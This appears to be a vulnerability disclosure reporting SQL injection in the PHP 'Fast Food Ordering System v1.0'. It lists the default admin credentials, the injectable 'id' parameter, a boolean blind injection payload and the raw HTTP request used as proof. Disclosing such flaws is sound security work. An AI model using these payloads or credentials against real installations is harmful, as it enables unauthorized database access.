# Fast Food Ordering System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15366/fast-food-ordering-system-phpoop-free-source-code.html

Vulnerability File: /ffos/admin/categories/view_category.php?id=

Vulnerability location: /ffos/admin/categories/view_category.php?id=, id

Current database name: ffos_db,length is 7

[+] Payload: /ffos/admin/categories/view_category.php?id=6%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /ffos/admin/categories/view_category.php?id=6%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=rlr2a917ahfp4mc52mm9a7kvvm
Connection: close
```

When length (database ()) = 6, Content-Length: 839
![image](https://user-images.githubusercontent.com/54017627/171350782-2324ca7e-b8e3-4282-90dc-0bf6d0f6dd9f.png)

![image](https://user-images.githubusercontent.com/54017627/171350858-df4d6823-d7d0-4554-a6c6-11a119f985f7.png)

When length (database ()) = 7, Content-Length: 737
![image](https://user-images.githubusercontent.com/54017627/171350729-07e94f74-c46b-485b-90fa-232cc131be3f.png)

![image](https://user-images.githubusercontent.com/54017627/171350831-0c11d5f2-8a72-4f28-85c0-e44430420714.png)
